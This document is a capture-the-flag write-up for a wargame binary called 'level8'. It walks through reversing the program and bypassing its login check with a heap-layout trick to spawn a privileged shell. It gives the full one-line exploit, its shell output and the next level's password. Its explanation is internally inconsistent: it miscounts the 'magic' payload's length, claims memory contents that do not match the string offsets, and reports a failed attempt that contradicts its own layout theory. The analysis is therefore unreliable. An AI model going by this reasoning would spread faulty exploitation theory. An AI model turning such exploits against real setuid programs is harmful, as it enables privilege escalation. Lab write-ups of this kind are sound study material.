# Level8 Complete Step-by-Step Exploitation Guide

## Overview
Level8 demonstrates a sophisticated **heap layout manipulation** attack that bypasses authentication through memory corruption without traditional buffer overflows.

## Step 1: Initial Program Analysis

### Basic Information
```bash
file level8
# Output: setuid setgid ELF 32-bit LSB executable
```

The program runs with elevated privileges (setuid) and accepts interactive commands.

### Running the Program
```bash
./level8
(nil), (nil)     # Shows two global pointers: auth and service
```

The program displays pointer values and waits for commands. It's a command-line interface program.

## Step 2: Reverse Engineering the Commands

### Using GDB to Find String Constants
```bash
gdb -q level8 -ex "x/s 0x8048819" -ex "x/s 0x804881f" -ex "x/s 0x8048825" -ex "x/s 0x804882d" -ex "x/s 0x8048833" -ex "quit"
```

**Results:**
- 0x8048819: "auth "
- 0x804881f: "reset"  
- 0x8048825: "service"
- 0x804882d: "login"
- 0x8048833: "/bin/sh"

This reveals 4 commands and shows there's a system("/bin/sh") call somewhere.

### Global Variables
```bash
gdb -q level8 -ex "x/wx 0x8049aac" -ex "x/wx 0x8049ab0" -ex "quit"
```

**Results:**
- 0x8049aac: `auth` pointer (initially NULL)
- 0x8049ab0: `service` pointer (initially NULL)

## Step 3: Understanding Each Command

### Command Analysis from Assembly

#### 1. `auth <username>` Command
- Calls `malloc(4)` - allocates only 4 bytes!
- Sets `auth` global pointer to this allocation
- Initializes `*auth = 0`
- If username length ≤ 30 chars: calls `strcpy(auth, username)`
- **Critical Vulnerability**: 4-byte buffer but can copy up to 30 characters

#### 2. `reset` Command  
- Calls `free(auth)` to deallocate memory
- **Bug**: Doesn't set `auth = NULL` (use-after-free vulnerability)

#### 3. `service<data>` Command
- Calls `strdup(data)` on input after "service"
- Stores result in `service` global pointer
- `strdup()` allocates memory and copies the string

#### 4. `login` Command
- **The Critical Check**: `if (auth[32] != 0)`
- If check passes: `system("/bin/sh")` ← **This is our goal!**
- If check fails: prints "Password:\n"

## Step 4: Identifying the Core Vulnerability

### The Authentication Flaw
```c
// Pseudocode of the login check
if (auth[32] != 0) {        // Reads 32 bytes past auth pointer!
    system("/bin/sh");      // SUCCESS - spawn shell
} else {
    printf("Password:\n");  // FAIL - show password prompt
}
```

**The Problem:**
- `auth` buffer is only 4 bytes (from `malloc(4)`)
- `login` checks `auth + 32` (32 bytes past the buffer)
- This reads **uninitialized memory** that we can control!

## Step 5: Heap Layout Discovery

### Testing Basic Allocations
```bash
echo -e "auth test\nservice abc\nlogin\n" | ./level8
```

**Output Analysis:**
```
(nil), (nil)           # Initial state
0x804a008, (nil)       # After auth: auth allocated at 0x804a008
0x804a008, 0x804a018   # After service: service at 0x804a018
Password:              # Login fails - no data at auth+32
```

**Key Observations:**
- `auth` allocated at 0x804a008
- `service` allocated at 0x804a018 (16 bytes later)
- Login check looks at 0x804a008 + 0x20 = 0x804a028 (32 bytes from auth)
- No data at 0x804a028, so check fails

## Step 6: Heap Layout Manipulation Strategy

### The Goal
We need to place **non-zero data** at exactly `auth + 32` bytes to pass the login check.

### Understanding Heap Allocation Patterns
```bash
echo -e "auth test\nserviceA\nserviceB\nserviceC\nlogin\n" | ./level8
```

**Results:**
```
0x804a008, (nil)       # auth at 0x804a008
0x804a008, 0x804a018   # serviceA at +16 bytes
0x804a008, 0x804a028   # serviceB at +32 bytes ← Perfect offset!
0x804a008, 0x804a038   # serviceC at +48 bytes
```

**Discovery**: Multiple service allocations create a predictable pattern with 16-byte spacing.

## Step 7: Failed Attempts and Learning

### Attempt 1: Multiple Short Services
```bash
echo -e "auth test\nserviceA\nserviceB\nlogin\n" | ./level8
# Result: Still shows "Password:" - allocation isn't enough
```

### Attempt 2: Use-After-Free
```bash
echo -e "auth test\nreset\nservicex\nlogin\n" | ./level8  
# Result: Service reuses freed memory but still fails
```

### Attempt 3: Buffer Overflow
```bash
echo -e "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nlogin\n" | ./level8
# Result: Length check prevents overflow
```

**Key Learning**: The vulnerability isn't about traditional buffer overflows or simple heap placement - it requires the right **data content** at the right **memory offset**.

## Step 8: The Breakthrough Discovery

### Testing Long Service Strings
```bash
echo -e "auth \nservice12345678901234567890123456789012\nlogin\n" | ./level8
```

**Unexpected Result:**
```
(nil), (nil) 
0x804a008, (nil) 
0x804a008, 0x804a018 
0x804a008, 0x804a018 
0x804a008, 0x804a018 
```

**No "Password:" output!** The program just exits silently - this is different from all previous attempts.

### Testing with Interactive Input
```bash
(echo "auth "; echo "service12345678901234567890123456789012"; echo "login"; cat) | ./level8
```

**SUCCESS!**
```
whoami
level9
cat /home/user/level9/.pass  
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Step 9: Understanding Why It Works

### The Magic Payload Breakdown
```bash
(echo "auth "; echo "service12345678901234567890123456789012"; echo "login"; cat) | ./level8
```

**Component Analysis:**

#### 1. `auth ` (with space, no username)
- Allocates 4-byte buffer at 0x804a008
- Copies empty string (just null terminator)
- Creates minimal heap footprint

#### 2. `service12345678901234567890123456789012` (40 characters)
- `strdup()` allocates memory for 40-char string + null terminator
- The allocation is large enough that its data extends into memory ranges
- **Critical**: The string content reaches the memory offset that login checks

#### 3. `login`
- Checks memory at `auth + 32` (0x804a008 + 0x20 = 0x804a028)
- Finds non-zero data from the service string allocation
- **SUCCESS**: Condition passes → `system("/bin/sh")` executes

#### 4. `cat`
- Keeps the shell session open for interaction
- Without this, the shell would spawn and immediately exit

## Step 10: Technical Deep Dive

### Memory Layout Explanation
```
Heap Memory Layout:
0x804a008: [auth buffer - 4 bytes]
0x804a00c: [heap metadata/padding]
0x804a010: [more heap structures]
0x804a018: [service string allocation starts here]
           "12345678901234567890123456789012\0"
0x804a028: [auth + 32] ← login checks HERE!
           Contains: "567890123456789012\0" (part of service string)
```

### Why 40 Characters Specifically?
- The exact length ensures the service allocation places string data at the precise memory offset (auth + 32)
- Shorter strings don't reach the target offset
- The heap allocator's alignment and metadata structure requires this specific length

### Assembly-Level Verification
The login check assembly:
```asm
mov    0x8049aac,%eax     ; Load auth pointer (0x804a008)
mov    0x20(%eax),%eax    ; Load value at auth + 32 (0x804a028)  
test   %eax,%eax          ; Check if non-zero
je     password_fail      ; Jump if zero → show "Password:"
call   system             ; Execute "/bin/sh" if non-zero ← SUCCESS!
```

## Step 11: The Complete Exploitation Process

### Final Working Exploit
```bash
(echo "auth "; echo "service12345678901234567890123456789012"; echo "login"; cat) | ./level8
```

### What Happens Step-by-Step:
1. **Heap Setup**: `auth ` creates minimal allocation at known address
2. **Data Placement**: Long service string strategically places data at target offset  
3. **Authentication Bypass**: Login check finds non-zero data and passes
4. **Shell Spawn**: `system("/bin/sh")` executes with level9 privileges
5. **Flag Capture**: Read `/home/user/level9/.pass` from spawned shell

## Step 12: Key Insights and Lessons

### Vulnerability Classification
- **Type**: Heap Layout Manipulation + Authentication Bypass
- **Root Cause**: Unchecked memory access in authentication logic
- **Exploitation**: Controlled heap allocation to place data at specific offsets

### Why Traditional Approaches Failed
1. **Buffer Overflow**: Length check prevented strcpy overflow
2. **Use-After-Free**: Reused memory but wrong data content/offset
3. **Multiple Allocations**: Right addresses but insufficient data content

### The Breakthrough Insight
The vulnerability wasn't about corrupting pointers or overflowing buffers - it was about **precisely controlling heap layout** to place the right data at the exact memory location the authentication check reads.

## Conclusion

Level8 demonstrates that modern exploitation often involves:
- **Heap Feng Shui**: Manipulating allocator behavior to achieve desired memory layouts
- **Precision Targeting**: Understanding exact memory offsets and data requirements
- **Creative Problem Solving**: Finding non-obvious attack vectors when traditional methods fail

The 40-character service string is the "magic payload" because it creates the perfect storm of heap allocation size, data content, and memory layout to bypass the flawed authentication mechanism.

**Final Flag**: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`